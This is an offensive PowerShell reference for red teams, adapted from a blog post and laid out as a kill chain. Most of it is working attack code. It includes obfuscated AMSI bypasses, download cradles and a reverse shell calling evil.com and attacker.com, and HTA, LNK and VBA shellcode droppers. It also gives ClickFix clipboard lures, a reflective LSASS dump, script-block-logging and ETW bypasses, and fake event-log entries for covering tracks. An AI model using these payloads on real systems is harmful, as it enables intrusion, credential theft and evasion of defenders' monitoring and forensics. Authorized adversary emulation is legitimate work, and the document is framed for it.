# Offensive PowerShell — Security Engineer Reference Document

> **Source:** Adapted from "Offensive PowerShell for Red Teamer with Defense Evasion Techniques" by Maland (screetsec.com, June 2026)
> **Classification:** FOR AUTHORIZED SECURITY TESTING / RED TEAM OPERATIONS ONLY
> **Purpose:** Operational reference for security engineers conducting authorized adversary emulation engagements

---

## Table of Contents

1. [Threat Landscape Assessment](#1-threat-landscape-assessment)
2. [PowerShell Defense Architecture](#2-powershell-defense-architecture)
3. [Defense Bypass Catalog](#3-defense-bypass-catalog)
4. [Attack Workflow — Full Kill Chain](#4-attack-workflow--full-kill-chain)
5. [Phase 1: Weaponization](#phase-1-weaponization)
6. [Phase 2: Delivery & Initial Access](#phase-2-delivery--initial-access)
7. [Phase 3: Internal Reconnaissance](#phase-3-internal-reconnaissance)
8. [Phase 4: Lateral Movement](#phase-4-lateral-movement)
9. [Phase 5: In-Memory .NET Assembly Execution](#phase-5-in-memory-net-assembly-execution)
10. [Phase 6: Credential Dumping](#phase-6-credential-dumping)
11. [Phase 7: Privilege Escalation](#phase-7-privilege-escalation)
12. [Phase 8: Logging Evasion](#phase-8-logging-evasion)
13. [Phase 9: Covering Tracks](#phase-9-covering-tracks)
14. [MITRE ATT&CK Technique Mapping](#mitre-attck-technique-mapping)
15. [Detection & Defensive Countermeasures](#detection--defensive-countermeasures)
16. [Tool Reference Catalog](#tool-reference-catalog)
17. [Obfuscation Technique Quick Reference](#obfuscation-technique-quick-reference)

---

## 1. Threat Landscape Assessment

### 1.1 Why PowerShell Remains Relevant

| Metric | Data Point | Source |
|--------|-----------|--------|
| Red Canary Ranking | Top 5 adversary tools for 4+ consecutive years | Red Canary Annual Threat Report |
| Mandiant Statement | Top 5 sub-technique used by threat actors | Kevin Mandia, CEO of Mandiant |
| Active APT Groups | APT28, FIN7, ToddyCat, StrongPity, APT29, APT33, APT41, Lazarus | Multiple threat intel reports |

### 1.2 APT Usage Patterns

| Group | Origin | PowerShell Usage |
|-------|--------|-----------------|
| APT28 | Russia | Download/execute scripts, run commands |
| FIN7 | — | Malware distribution, recon, post-exploitation |
| ToddyCat | — | Post-exploit data collection |
| StrongPity | — | Add files to Windows Defender exclusions |
| APT29 | Russia | Multiple operations |
| APT33 | Iran | Multiple operations |
| APT41 | China | Multiple operations |
| Lazarus | North Korea | Multiple operations |

### 1.3 Why Attackers Choose PowerShell

- **Native**: Pre-installed on all Windows systems — no deployment needed
- **Fileless**: In-memory execution without disk artifacts
- **.NET Integration**: Direct access to .NET APIs and Windows internals
- **Low Footprint**: Minimizes detection surface vs. custom binaries
- **Multi-platform**: PowerShell Core runs on Linux/macOS too

---

## 2. PowerShell Defense Architecture

Windows implements multiple defense layers for PowerShell:

| Defense Layer | Function | Bypass Difficulty |
|--------------|----------|-------------------|
| **Execution Policy** | Restricts unsigned/unrestricted script execution | Trivial (administrative control, not security) |
| **AMSI** (Antimalware Scan Interface) | Runtime scanning of script content against signature library | Moderate (multiple techniques available) |
| **Script Block Logging** | Records all script blocks executed in PowerShell | Moderate (reflection/AST smuggling) |
| **CLM** (Constrained Language Mode) | Restricts .NET API access and advanced features | Hard (requires configuration bypass) |
| **ETW** (Event Tracing for Windows) | Real-time telemetry for PowerShell activity | Moderate (hooking/reflection) |
| **Windows Defender/AV** | Signature-based detection of known malware | Variable (depends on signatures) |
| **Transcription Logging** | Records all PowerShell I/O to file | Hard (must disable or redirect) |

---

## 3. Defense Bypass Catalog

### 3.1 Execution Policy Bypass

**Classification:** Administrative control, NOT a security boundary.

| Technique | Command | Notes |
|-----------|---------|-------|
| Process-scope bypass | `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force` | Current process only |
| User-scope bypass | `Set-ExecutionPolicy -Scope CurrentUser Unrestricted` | Current user session |
| Single-file bypass | `PowerShell -ExecutionPolicy Bypass -File script.ps1` | One-time, no config change |
| Inline bypass | `PowerShell -ep Bypass -Command "Invoke-Expression ..."` | Shortcut for one-liners |

### 3.2 AllSigned GPO Bypass

When GPO enforces `AllSigned` execution policy, use `Invoke-Expression` to execute commands directly in memory — no script file touches disk.

### 3.3 AMSI Bypass Techniques

#### 3.3.1 PowerShell v2 Downgrade

**Concept:** PowerShell v2.0 predates AMSI — no scanning occurs.

**Detection:** Monitor for PowerShell v2 engine loading (`PowerShell -Version 2`).

**Limitation:** Does not work if CLM is enforced alongside v2 deprecation.

#### 3.3.2 String Obfuscation ("String Kung-Fu")

Seven techniques for hiding suspicious strings from AMSI signatures:

| # | Technique | Example | Principle |
|---|-----------|---------|-----------|
| 1 | **String Reversal** | `$rev = "ztakimiM-ekovnI"; $cmd = ($rev[-1..-($rev.Length)] -join ''); & $cmd` | Reverse + reconstruct |
| 2 | **Char Array Join** | `$arr = @('I','n','v','o','k','e','-','M','i','m','i','k','a','t','z'); $pwsh = $arr -join ''; & $pwsh` | Split to chars + rejoin |
| 3 | **String Concatenation** | `$a="Invoke-"; $b="Mimik"; $c="atz"; & ($a+$b+$c)` | Multi-variable assembly |
| 4 | **Backtick Escaping** | `& "I\`n\`v\`o\`k\`e-M\`i\`m\`i\`k\`a\`t\`z"` | Backtick between chars |
| 5 | **CHAR Encoding** | `$b64="SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA"; $bytes=[Convert]::FromBase64String($b64); $pwsh=[System.Text.Encoding]::Unicode.GetString($bytes); & $pwsh` | Base64 → Unicode decode |
| 6 | **Format-String Substitution** | `$pwsh = "{0}{1}" -f "Invoke-","Mimikatz"; & $pwsh` | .NET format strings |
| 7 | **Cmdlet Substring** | `$inv = (Get-Alias iex).Definition.Substring(0,7); $mimi = [String]::Join('', @([char]77,[char]105,[char]109,[char]105,[char]107,[char]97,[char]116,[char]122))` | Alias dissection + char codes |

**Automation:** Invoke-Obfuscation (Daniel Bohannon) — supports layered/combined techniques.

**Detection Counter:** AMSI signature bypass via obfuscation is increasingly detectable by behavioral analytics (AMSI content inspection + ML models). Combine multiple techniques for best effect.

#### 3.3.3 Reflection-Based AMSI Bypass

**Concept:** Use .NET reflection to set `amsiInitFailed = true` in the `AmsiUtils` class.

**Key Pattern:**
1. Load `System.Management.Automation.dll` assembly
2. Locate `AmsiUtils` nested type via reflection
3. Set `amsiInitFailed` field to `$true`

**Detection:** Public scripts are signature-flagged. Must obfuscate the reflection script itself using techniques from 3.3.2.

**Obfuscated Variant Example:**
```powershell
& {$XxYyZz=[APPdOmAin]::cUrREntDOmaiN.gEtasSEmbLiEs()|
  WherE-ObJEcT{$_.lOcaTiON -aNd $_.loCatiON.ENDSWIth('System.Management.Automation.dll')};
  $AaBbCc=[SYstEM.ReflECTioN.BiNDiNGflags]'NonPublic,Static';
  $ClAsSTaRgEt=$XxYyZz.gETTYPEs()|wHErE-obJecT{$_.nAMe -EQ $(
    [stRinG][Char](25+40)+[chAR]([bYtE]0X6d)+[cHAr]([BYTe]0x73)+
    [Char]((105*47/47))+[cHAr]([byte]0X55)+[chAr](116+97-97)+
    [CHAr]([Byte]0x69)+[cHAr](0xCAcb -bXOR 0Xcaa7)+[chaR]([byte]0X73))};
  [SystEm.ThREADING.threaD]::sLeep(499);
  $FiElDaCcEsS=$ClAsSTaRgEt.geTfIeld($(
    [strinG][ChAr](97+11-11)+[CHar]([BYte]0X6d)+[CHar]([ByTE]0x73)+
    [chAr](105*69/69)+[cHaR](43+30)+[chAr]([bYtE]0x6e)+
    [CHAr]([bYTE]0X69)+[ChAR]((0x94D4 -BxoR 0X94A0))+
    [CHar]([bYTe]0X46)+[cHaR]([bytE]0x61)+[ChaR]([bYTe]0X69)+
    [chAr](108+102-102)+[ChaR](76+25)+[ChaR]([bYtE]0x64)),$AaBbCc);
  $FiElDaCcEsS.seTVAlUe($NuLL,$tRuE)}
```

#### 3.3.4 Memory Patching (AmsiScanBuffer)

**Concept:** Patch the `AmsiScanBuffer` function in `amsi.dll` to always return error code `0x80070057` (E_INVALIDARG).

**Mechanism:**
1. Load `amsi.dll` via `LoadLibrary`
2. Get `AmsiScanBuffer` address via `GetProcAddress`
3. Change memory protection to RWX via `VirtualProtect`
4. Overwrite function prologue with: `MOV EAX, 0x80070057; RET`
5. Patch bytes: `B8 57 00 07 80 C3`

**Code Pattern (C# via Add-Type):**
```csharp
using System;
using System.Runtime.InteropServices;
public class MLNDAR {
    [DllImport("Kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("Kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("Kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);
}
```

**Detection:** This technique's signature is widely recognized by modern EDRs. Use HTML-decoded entity strings for `amsi.dll` and `AmsiScanBuffer` to reduce visibility.

**2026 Assessment:** Memory patching is increasingly detected. More effective approaches use indirect methods — .NET reflection, COM objects, or C# assemblies via CIM/WMI.

---

## 4. Attack Workflow — Full Kill Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    OFFENSIVE POWERSHELL KILL CHAIN                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  PHASE 0: PRE-ACCESS                                                    │
│  ├── Defense Bypass (Execution Policy, AMSI)                            │
│  └── Payload Preparation (Obfuscation, Encoding)                        │
│                                                                         │
│  PHASE 1: WEAPONIZATION                                                 │
│  ├── HTA Files (JS/VBScript/WMI execution vectors)                      │
│  ├── Office Macros (VBA + XOR-encoded shellcode)                        │
│  └── LNK Files (Create new / Backdoor existing)                         │
│                                                                         │
│  PHASE 2: DELIVERY & INITIAL ACCESS                                      │
│  ├── ClickFix (Fake CAPTCHA → clipboard → Win+R execution)             │
│  ├── ClickFix Variants (Two-step, Clipboard chaining, BitB)            │
│  ├── FileFix (File Explorer address bar execution)                     │
│  └── Task Manager Run Dialog                                            │
│                                                                         │
│  PHASE 3: INTERNAL RECON                                                │
│  ├── PowerView (AD enumeration)                                         │
│  └── BloodHound/SharpHound (attack path mapping)                        │
│                                                                         │
│  PHASE 4: LATERAL MOVEMENT                                              │
│  ├── PowerShell Remoting (Enter-PSSession, Invoke-Command)             │
│  ├── WMI (Win32_Process.Create)                                        │
│  └── Empire Framework                                                   │
│                                                                         │
│  PHASE 5: IN-MEMORY ASSEMBLY EXECUTION                                  │
│  └── Reflective Loading (Base64 → GZip → Assembly.Load())              │
│                                                                         │
│  PHASE 6: CREDENTIAL DUMPING                                            │
│  ├── PowerShell Native (LSASS dump via reflection)                     │
│  ├── Invoke-Mimikatz (modified/obfuscated)                             │
│  └── Custom Binary Loader (NetLoader + Codecepticon + ConfuserEx)      │
│                                                                         │
│  PHASE 7: PRIVILEGE ESCALATION                                          │
│  └── PowerUp / winPeas / PrivescCheck                                   │
│                                                                         │
│  PHASE 8: LOGGING EVASION                                               │
│  ├── Script Block Logging Smuggling (AST manipulation)                 │
│  ├── Script Block Logging Bypass (Reflection — cachedGroupPolicySettings)│
│  ├── ETW Bypass (EtwEventWrite hooking, m_enabled=0)                   │
│  └── .NET Profiler API (Invisi-Shell)                                   │
│                                                                         │
│  PHASE 9: COVERING TRACKS                                              │
│  ├── PowerShell History Manipulation                                    │
│  └── Event Log Manipulation (Fake entries, Write-EventLog)             │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Phase 1: Weaponization

### 1.1 PowerShell Download Cradle

**Purpose:** Fetch and execute payloads from remote servers directly in memory (fileless).

**Basic Patterns:**
```powershell
# WebClient
(New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")

# IWR + IEX
IEX(IWR "http://evil.com/payloads.ps1")

# Chained cradle
PowerShell -c "IEX(IWR http://evil.com/amsi.ps1 -UseBasicParsing);IEX(iwr http://evil.com/shell.ps1)"
```

**Obfuscated Cradle (char array encoding):**
```powershell
powershell -command "&([String]::Join('',[Char[]](73,69,88))) (New-Object 
  ([Text.Encoding]::ASCII.GetString([Byte[]](83,121,115,116,101,109,46,78,101,116,
  46,87,101,98,67,108,105,101,110,116)))).(
  [String]::Join('',[Char[]](68,111,119,110,108,111,97,100,83,116,114,105,110,103))
  ).Invoke(('{1}{4}{2}{3}{0}' -f 'payload.ps1','http://','local.','com/','pwsh.'))"
```

**Reflection-based cradle (avoids detected keywords):**
```powershell
$xq5M=[typE]('{1}{2}{0}'-f('pWebR'+'equest'),'Ne','t.Htt');
$v=((((gET-vAriABLE xq5M).vAlue::Create('http://evil.com/payload.ps1')
  .PSObject.Methods|?{$_.Name-clike'G*se'}).Invoke())
  .PSObject.Methods|?{$_.Name-clike'G*eam'}).Invoke();
$r='';Try{While($r+=[Char]$v.ReadByte()){}}Catch{};
&(GCM *ke-*pr*)$r
```

### 1.2 PowerShell Reverse Shell

**Basic Pattern:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('attacker.com',443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = iex $data 2>&1 | Out-String
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = [Text.Encoding]::ASCII.GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Obfuscated Variant (no AMSI bypass needed):**
- Uses format-string substitution, variable name randomization
- Avoids common detected keywords (IEX, GetStream, etc.)
- Recommend using `amsi-trigger` tool to identify flagged strings iteratively

### 1.3 HTML Application (HTA)

Three execution vectors within HTA files:

#### JavaScript Execution
```html
<script>
 var cmd = "powershell.exe -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://evil.com/a'));\"";
 var wsh = new ActiveXObject("WScript.shell");
 wsh.run(cmd);
</script>
```

#### VBScript Execution (with fake error dialog)
```html
<script language="VBScript">
 Set varShell = CreateObject("Wscript.Shell")
 varShell.run "WebCradle",0
 MsgBox "Unable to load Meeting. ERROR: 'plugin_not_installed'", vbOk+vbCritical, "Error"
 self.close
</script>
```

#### VBScript via WMI (stealthier parent-child process)
```html
<script language="VBScript">
Set objSWbemLocator = CreateObject("WbemScripting.SWbemLocator")
Set objServices = objSWbemLocator.ConnectServer(".", "\root\cimv2")
set objProcess = objServices.Get("Win32_Process")
objProcess.Create("powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient;
  $wc.Headers.Add('User-Agent','Mozilla/5.0');
  $wc.proxy = [System.Net.WebRequest]::DefaultWebProxy;
  IEX ($wc.downloadstring('http://domain.com/payload'))")
self.close
</script>
```

**Key Insight:** WMI-spawned PowerShell creates a more "normal" parent-child process relationship (`WmiPrvSE.exe → powershell.exe` instead of `mshta.exe → powershell.exe`).

### 1.4 Microsoft Office Macros (VBA)

**Workflow:**
1. Generate shellcode: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=443 EXITFUNC=thread -f csharp`
2. XOR-encode shellcode with fixed key (e.g., `0xFA`) using C# helper
3. Embed encoded array in VBA macro
4. VBA decodes at runtime, allocates memory, executes

**Anti-Sandbox Measures in VBA:**
- `FlsAlloc` check — detects anomalous environments
- Sleep timer verification — 10-second sleep, verify elapsed time
- If sandbox detected, `Exit Sub`

**VBA Shellcode Runner Pattern:**
```vba
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (...)
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (...)
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (...)
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (...)
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (...)

Sub LegitMacro()
  ' FlsAlloc sandbox check
  ' Sleep(10000) + time verification
  ' XOR decode shellcode
  ' VirtualAlloc → RtlMoveMemory → CreateThread
End Sub
```

**Auto-Execution Triggers:** `AutoOpen()`, `Document_Open()`

### 1.5 Shortcut (LNK) Files

**Creating malicious LNK:**
```powershell
$object = new-object -COM WScript.Shell
$lnk = $object.CreateShortcut("MyLNK.lnk")
$lnk.WindowStyle = 7  # Minimized
$lnk.TargetPath = "%windir%\System32\regsvr32.exe"
$lnk.IconLocation = "C:\Program Files\Internet Explorer\iexplore.exe,1"
$lnk.Arguments = "/s /n /u /i:http://evil.com/malware.sct scrobj.dll"
$lnk.Save()
```

**Backdooring existing LNK (HarmJ0y's BackdoorLNK.ps1):**
- Stores base64 payload in registry (`HKCU:\Software\Microsoft\Windows\debug`)
- LNK launches original app + decodes/executes registry payload
- Preserves original icon and functionality

---

## Phase 2: Delivery & Initial Access

### 2.1 ClickFix (Fake CAPTCHA)

**Concept:** Social engineering technique that tricks users into copying and pasting malicious commands into PowerShell or Run dialog (Win+R).

**Single-Step Flow:**
1. Fake page shows "verifying" spinner
2. Transitions to "Install Extension & Join" button
3. Button copies payload to clipboard via `navigator.clipboard.writeText()`
4. Instructions: Win+R → Ctrl+V → Enter

**Two-Step Variant:**
1. First click copies decoy text ("Initializing secure tunnel...")
2. Shows fake "session token" code block
3. Second click (on code block) copies actual payload
4. More natural interaction flow, harder to detect

**Clipboard Chaining Variant:**
- 9 sequential `navigator.clipboard.writeText()` calls
- First 8 = decoy values
- 9th = actual payload
- Each overwrites previous; only final value persists
- Complicates automated analysis

**Function Obfuscation:**
```javascript
const a = ["n","a","v","i","g","a","t","o","r"].join("");
const b = ["c","l","i","p","b","o","a","r","d"].join("");
const c = ["w","r","i","t","e","T","e","x","t"].join("");
const x = ["c","m","d",".","e","x","e"," ","/","c"," ","p","i","n","g"," ","e","x","a","m","p","l","e",".","c","o","m"].join("");
const ab = window[a][b];
ab[c](x);
```

### 2.2 ClickFix Attack Chain (Scenario X)

**Multi-stage social engineering:**
1. Fake job interview site mimicking legitimate company
2. Browser-in-the-Browser (BitB) for fake Google Meet window
3. Fake CAPTCHA "security verification" step
4. ClickFix payload delivery
5. RunMRU registry cleanup post-execution

### 2.3 ClickFix Defense Evasion (RunMRU)

**Problem:** Run dialog history stored in `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`

**Solution:** Overwrite RunMRU entries post-execution:
```powershell
$runMruPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
$newValue = 'phtalks'
$mruList = (Get-ItemProperty -Path $runMruPath -ErrorAction SilentlyContinue).MRUList
if ($mruList) {
    Set-ItemProperty -Path $runMruPath -Name "$($mruList[0])" -Value "$newValue`\1"
}
```

### 2.4 FileFix (File Explorer Address Bar)

**Use case:** When Run dialog is blocked by policy.

**Flow:**
1. Malicious page copies payload to clipboard
2. Instructions: Win+E → Alt+D → Ctrl+V → Enter
3. File Explorer address bar executes command

### 2.5 Task Manager Run Dialog

**Alternative execution vector:**
- Ctrl+Shift+Esc → opens Task Manager
- Alt+N → "Create new task" dialog
- Paste and execute

---

## Phase 3: Internal Reconnaissance

### 3.1 PowerView (PowerSploit Framework)

| Cmdlet | Function |
|--------|----------|
| `Get-NetUser` | List domain users with details |
| `Get-NetComputer` | List domain-joined computers |
| `Find-LocalAdminAccess` | Find machines where current user is local admin |
| `Invoke-ShareFinder` | Discover shared folders across domain |

**Operational Note:** Default PowerView scripts are AMSI-flagged. Obfuscate or execute function-by-function to reduce detection.

### 3.2 BloodHound / SharpHound

**Stealth collection approach:**
```bash
# Exclude Domain Controllers, stealth mode, no disk cache
SharpHound.exe --excludedomaincontrollers --stealth --nosavecache

# ACL-only collection (targeted)
SharpHound.exe --excludedomaincontrollers -c acl --nosavecache
```

**Operational Principles:**
- Avoid direct Domain Controller contact
- Collect only what's needed for current attack phase
- Never cache to disk

---

## Phase 4: Lateral Movement

### 4.1 PowerShell Remoting

| Cmdlet | Use Case |
|--------|----------|
| `Enter-PSSession` | Interactive remote session |
| `Invoke-Command` | Non-interactive remote execution (multi-host capable) |

### 4.2 WMI

**Enumeration Commands:**
```powershell
wmic process list brief                    # Running processes
wmic group list brief                      # Local groups
wmic useraccount list /format:list         # User accounts
wmic sysaccount list /format:list          # System accounts
wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *  # AV products
```

**AD Enumeration via WMI:**
```powershell
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'"
Get-CimInstance -ClassName Win32_Group -Filter "Domain = '<DOMAIN>'"
```

### 4.3 Empire Framework

- PowerShell-based post-exploitation framework
- Automates credential access, lateral movement, persistence
- Web GUI for agent/listener/module management
- Best for complex environments where manual cmdlet execution is inefficient

---

## Phase 5: In-Memory .NET Assembly Execution

### 5.1 Reflective Assembly Loading

**Concept:** Load .NET assemblies (Mimikatz, Seatbelt, SharpHound) from memory — no disk artifacts.

**Pattern:**
1. Assembly stored as Base64 + GZip compressed
2. Decode Base64 → Decompress GZip → `Assembly.Load()`
3. Capture console output via `StringWriter`
4. Call entry point method

```powershell
function Invoke-Assembly {
    [CmdletBinding()] Param ([String]$Command = " ")
    $a = New-Object IO.MemoryStream(,[Convert]::FromBase64String("[B64]"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CompressionMode]::Decompress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo($output)
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    
    [Namespace.Program]::Main($Command)
    
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
```

**Chain:** Combine AMSI bypass + assembly loading for full stealth execution.

---

## Phase 6: Credential Dumping

### 6.1 PowerShell Native LSASS Dump

**Technique:** Use .NET reflection to access `MiniDumpWriteDump` via `WindowsErrorReporting.NativeMethods`.

**Key Pattern:**
```powershell
$S = "C:\temp"
$P = (Get-Process lsass)
$A = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
$B = $A.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
$C = [Reflection.BindingFlags] 'NonPublic, Static'
$D = $B.GetMethod('MiniDum'+'pWriteDump', $C)
$PF = "$($P.Name)_$($P.Id).dmp"
$PDP = Join-Path $S $PF
$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
$R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
$F.Close()
```

**Advantage:** No external tool needed. Uses reflection to avoid suspicious API calls.

### 6.2 Invoke-Mimikatz Modification

**Required modifications:**
- Remove default comments
- Rename script, function, and variable names
- Modify Win32 API variable names (`VirtualProtect`, `WriteProcessMemory`, `CreateRemoteThread`)
- Obfuscate `Invoke-MimiEx` execution and PEBytes content

### 6.3 Custom Binary Loader Pipeline

**Tool Chain:**
1. **NetLoader** (base loader) — Program.cs as starting point
2. **Codecepticon** — source code obfuscation (disguise structures/patterns)
3. **ConfuserEx 2** — binary-level obfuscation post-compilation

**Result:** Binary that loads and executes payloads in memory with heavily obfuscated source and binary.

---

## Phase 7: Privilege Escalation

### 7.1 Enumeration Tools

| Tool | Type | Notes |
|------|------|-------|
| **PowerUp** | PowerShell | `Invoke-AllChecks` — service abuse, DLL hijacking, registry misconfig |
| **winPeas** | Binary | Windows privilege escalation enumeration |
| **PrivescCheck** | PowerShell | Alternative privesc checker |

**Operational Note:** All public scripts are known to defensive solutions. Obfuscate before use.

### 7.2 Common Privesc Vectors

- Service misconfiguration (unquoted paths, weak permissions)
- DLL hijacking
- Registry misconfigurations
- Token impersonation
- AlwaysInstallElevated

---

## Phase 8: Logging Evasion

### 8.1 Script Block Logging Smuggling (AST Manipulation)

**Concept:** Manipulate PowerShell's Abstract Syntax Tree (AST) so logged content differs from executed content.

**Mechanism:**
1. **Benign script block** — visible to logging (e.g., `Write-Output 'Hello'`)
2. **Malicious script block** — downloaded from remote, actual payload
3. AST reshaped: `Extent` from benign block, `EndBlock` from malicious block
4. Logger sees benign content; executor runs malicious content

**Detection Counter:** Very difficult to detect via log analysis alone. Requires memory scanning or behavioral analytics.

### 8.2 Script Block Logging Bypass (Reflection)

**Concept:** Disable Script Block Logging by modifying `cachedGroupPolicySettings` via reflection.

```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils') `
    .GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

$BypassValues = New-Object 'System.Collections.Generic.Dictionary[string,System.Object]'
$BypassValues.Add('EnableScriptBlockLogging', '0')
$BypassValues.Add('EnableScriptBlockInvocationLogging', '0')

$GroupPolicySettings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $BypassValues
```

### 8.3 ETW Bypass

#### Method 1: EtwEventWrite Hooking
Patch `EtwEventWrite` in `ntdll.dll` with `RET` (0xC3) instruction:
```csharp
IntPtr hNtdll = LoadLibrary("ntdll.dll");
IntPtr etwAddr = GetProcAddress(hNtdll, "EtwEventWrite");
uint oldProtect;
VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
byte[] patch = { 0xC3 }; // ret
Marshal.Copy(patch, 0, etwAddr, 1);
VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
```

#### Method 2: m_enabled Field Reset
```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType(
    'System.Diagnostics.Eventing.EventProvider'
).GetField('m_enabled','NonPublic,Instance').SetValue(
    [Ref].Assembly.GetType(
        'System.Management.Automation.Tracing.PSEtwLogProvider'
    ).GetField('etwProvider','NonPublic,Static').GetValue($null), 0
)
```

#### Method 3: Remove-EtwTraceProvider
```powershell
Remove-EtwTraceProvider -SessionName EventLog-Application `
    -Guid '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'
```

### 8.4 .NET Profiler API (Invisi-Shell)

**Concept:** Force PowerShell to run under a CLR profiler that hooks .NET assemblies to suppress logging.

**Setup:**
```cmd
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "InvisiShellProfiler.dll" /f
powershell
```

**Targets Hooked:** `System.Management.Automation.dll`, `System.Core.dll`

**Cleanup:** Remove registry key + environment variables after session.

---

## Phase 9: Covering Tracks

### 9.1 PowerShell History Manipulation

| Technique | Method | Detail |
|-----------|--------|--------|
| **Delete history file** | Remove `PSReadLine` history file | Most basic approach |
| **Edit history file** | Selectively remove entries | Surgical cleanup |
| **Set HistorySaveStyle** | `Set-PSReadLineOption -HistorySaveStyle SaveNothing` | Disables all future history |
| **Execute via ISE** | Use PowerShell ISE | ISE doesn't save history like console |
| **Custom history path** | Redirect history to alternate location | `(Get-PSReadLineOption).HistorySavePath` |

**HistorySaveStyle Options:**
| Value | Behavior |
|-------|----------|
| `SaveIncrementally` | Default — saves after each command |
| `SaveAtExit` | Saves only on PowerShell window close |
| `SaveNothing` | Disables history file entirely |

### 9.2 Event Log Manipulation

**Concept:** Windows allows arbitrary writes to Event Log — even remotely. Insert fake legitimate-looking entries to pollute forensic analysis.

**Basic Fake Entry:**
```powershell
$Arguments = @('Windows PowerShell', '.', 'PowerShell')
$Instance = New-Object -TypeName Diagnostics.EventInstance -ArgumentList 400, 4
$PowerShellEventLog = New-Object -TypeName Diagnostics.EventLog -ArgumentList $Arguments
$PowerShellEventLog.WriteEvent($Instance, @('Available', 'None', 'Fake entry!!!'))
```

**Template-Matched Fake Log (mimics genuine PowerShell engine state log):**
```powershell
$EventTemplate = @'
 NewEngineState={0}
 PreviousEngineState={1}
 SequenceNumber={2}
 HostName={3}
 HostVersion={4}
 HostId={5}
 HostApplication={6}
 EngineVersion={7}
 RunspaceId={8}
 PipelineId={9}
 CommandName={10}
 CommandType={11}
 ScriptName={12}
 CommandPath={13}
 CommandLine={14}
'@ -f 'Available', 'None', '32807', 'Default Host',
    '5.1.16299.19', '0c8d6f6a-594c-4f1b-9a80-cff8c152c469',
    'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
    '5.1.16299.19', '8c06e414-3e2e-488a-a072-c7e295b28631',
    '', '', '', '', '', ''

$EventInstance = New-Object -TypeName System.Diagnostics.EventInstance -ArgumentList 400, 4
$PowerShellEventLog = New-Object -TypeName System.Diagnostics.EventLog `
    -ArgumentList 'Windows PowerShell', '.', 'PowerShell'
$PowerShellEventLog.WriteEvent($EventInstance, @('Available', 'None', $EventTemplate))
```

**Arbitrary Write/Read:**
```powershell
Write-EventLog -LogName 'Windows PowerShell' -Source PowerShell `
    -Category 4 -EventId 1337 -RawData @(0,1,2,3) -Message ' '

Get-EventLog -LogName 'Windows PowerShell' -Source PowerShell `
    -InstanceId 1337 | Select-Object -ExpandProperty Data
```

**Forensic Impact:** Defenders analyzing logs must distinguish between legitimate and fabricated entries — significantly complicating incident response.

---

## MITRE ATT&CK Technique Mapping

| Phase | Technique | MITRE ID | Tactic |
|-------|----------|----------|--------|
| Defense Bypass | Execution Policy Bypass | T1059.001 | Execution |
| Defense Bypass | AMSI Bypass (v2 downgrade) | T1562.001 | Defense Evasion |
| Defense Bypass | AMSI Bypass (reflection) | T1562.001 | Defense Evasion |
| Defense Bypass | AMSI Bypass (memory patching) | T1562.001 | Defense Evasion |
| Defense Bypass | Obfuscation (string kung-fu) | T1027.005 | Defense Evasion |
